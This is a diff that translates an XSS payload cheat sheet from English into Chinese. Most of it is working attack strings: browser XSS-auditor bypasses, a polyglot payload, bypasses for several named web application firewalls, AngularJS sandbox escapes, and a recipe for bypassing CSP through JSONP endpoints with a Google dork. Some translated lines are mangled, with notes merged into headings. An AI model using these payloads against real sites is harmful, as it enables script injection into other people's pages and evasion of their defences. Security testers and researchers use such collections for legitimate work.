@@ -1,18 +1,18 @@
 ## XSS
 
-**Chrome XSS-Auditor Bypass** by [@vivekchsm](https://twitter.com/vivekchsm)
+**Chrome XSS-Auditor 绕过** by [@vivekchsm](https://twitter.com/vivekchsm)
 
 ```html
 <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
 ```
 
-**Chrome < v60 beta XSS-Auditor Bypass**
+**Chrome < v60 beta XSS-Auditor 绕过**
 
 ```html
 <script src="data:,alert(1)%250A-->
 ```
 
-**Other Chrome XSS-Auditor Bypasses**
+**Other Chrome XSS-Auditor 绕过**
 
 ```html
 <script>alert(1)</script
@@ -26,31 +26,32 @@
 <x>%00%00%00%00%00%00%00<script>alert(1)</script>
 ```
 
-**Safari XSS Vector** by [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)
+**Safari XSS 向量** by [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)
 
 ```html
 <script>location.href;'javascript:alert%281%29'</script>
 ```
 
-**XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
+**XSS 变种** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
-**Kona WAF (Akamai) Bypass**
+**Kona WAF (Akamai) 绕过**
 
 ```html
 \');confirm(1);//
 ```
 
-**ModSecurity WAF Bypass**
-Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
+**ModSecurity WAF 绕过**
+注意:这取决于应用程序设置的安全级别。参见:https://modsecurity.org/rules.html
+
 ```html
 <img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
 ```
 
-**Wordfence XSS Bypasses**
+**Wordfence XSS 绕过**
 
 ```html
 <meter onmouseover="alert(1)"
@@ -64,7 +65,7 @@ Note: This kind of depends on what security level the application is set to. See
 >><marquee loop=1 width=0 onfinish=alert(1)>
 ```
 
-**Incapsula WAF Bypasses** by [@i_bo0om](https://twitter.com/i_bo0om)
+**Incapsula WAF 绕过** by [@i_bo0om](https://twitter.com/i_bo0om)
 
 ```html
 <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
@@ -81,12 +82,12 @@ Note: This kind of depends on what security level the application is set to. See
 $.get('http://sakurity.com/jqueryxss')
 ```
 
-In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:
+为了真正利用这个jQuery XSS，你需要满足以下要求之一:
 
-1) Find any cross domain requests to untrusted domains which may inadvertently execute script.
-2) Find any requests to trusted API endpoints where script can be injected into data sources.
+1)发现任何跨域请求到不受信任的域，可能会无意中执行脚本。
+2)找到任何可以将脚本注入数据源的可信API端点的请求。
 
-**URL verification bypasses (works without `&#x09;` too)**
+**URL 验证绕过 （没有 `&#x09;` 也行)**
 
 ```
 javas&#x09;cript://www.google.com/%0Aalert(1)
@@ -155,9 +156,7 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 
 - FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`
 
-_Note: Useful reference on constructing Flash-based XSS payloads available at [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._
-
-**Lightweight Markup Languages**
+**_Note:关于构建基于flash的XSS有效负载的有用参考资料[MWR Labs](https://labs.mwrinfosecurity.com/blog/poppingalert1 -in-flash/)._Lightweight Markup Languages**
 
 **RubyDoc** (.rdoc)
 
@@ -179,17 +178,15 @@ XSS[JavaScript:alert(1)]
 __ javascript:alert(document.domain)  
 ```
 
-**Unicode characters**
+**Unicode 编码**
 
 ```html
 †‡•＜img src=a onerror=javascript:alert('test')>…‰€
 ```
 
-**AngularJS Template Injection based XSS**
+**AngularJS 模板注入 XSS**
 
-*For manual verification on a live target, use `angular.version` in your browser console*
-
-**1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
+***要对活动目标进行手动验证，请使用“angular”。版本'在您的浏览器控制台*1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
 
 ```js
 {{constructor.constructor('alert(1)')()}}
@@ -316,19 +313,19 @@ __ javascript:alert(document.domain)
 {{constructor.constructor('alert(1)')()}}
 ```
 
-**Content Security Policy (CSP) bypass via JSONP endpoints**
+**Content Security Policy (CSP) 绕过 ，通过 JSONP**
 
-Grab the target's CSP:
+获取目标 CSP:
 
 ```
 curl -I http://example.com | grep 'Content-Security-Policy'
 ```
 
-Either paste the CSP into https://csp-evaluator.withgoogle.com/ or just submit the target's address into the "Content Security Policy" field. The CSP Evaluator will notify you if one of the whitelisted domains has JSONP endpoints.
+要么将CSP粘贴到https://csp-evaluator.withgoogle.com/中，要么将目标地址提交到“Content Security Policy”字段中。如果其中一个白名单域具有JSONP端点，CSP评估器将通知您。
 
 ![image](https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png)
 
-Now we can use a Google dork to find some JSONP endpoints on the domains listed above.
+现在，我们可以使用谷歌dork在上面列出的域中找到一些JSONP端点。
 
 ```
 site:example.com inurl:callback
